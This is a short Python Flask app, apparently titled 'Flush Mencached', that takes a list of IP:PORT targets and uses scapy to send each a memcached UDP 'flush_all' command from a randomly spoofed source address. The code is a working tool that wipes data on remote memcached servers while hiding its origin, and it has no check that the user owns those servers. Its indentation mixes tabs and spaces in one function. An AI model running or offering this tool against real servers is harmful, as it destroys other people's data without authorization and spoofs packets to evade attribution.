from scapy.all import *
from flask import request
from flask import Flask
import random
import socket
import struct

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def hello():
    if request.method == 'POST':
        return  '<h1>Flush Mencached</h1><form action="/" method="POST">Please input IP address(IP:PORT):<br><textarea name="data" rows="20" cols="18"></textarea><br><input type="submit" value="Submit"></form>' + flushmemc(request.form['data'])
    else:
        return '<h1>Flush Mencached</h1><form action="/" method="POST">Please input IP address(IP:PORT):<br><textarea name="data" rows="20" cols="18"></textarea><br><input type="submit" value="Submit"></form>'

def flushmemc(data):
    addresslist = data.split('\r\n')
    result = ''
    memccmd = '\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n'
    for address in addresslist:
	iplist = address.split(':')
        srcip = randomip()
        pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=53, dport=int(iplist[1]))/memccmd
        send(pkt, inter=1, count=1)
        result = result + address + ':OK<br>' 
    return result

def randomip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=True)
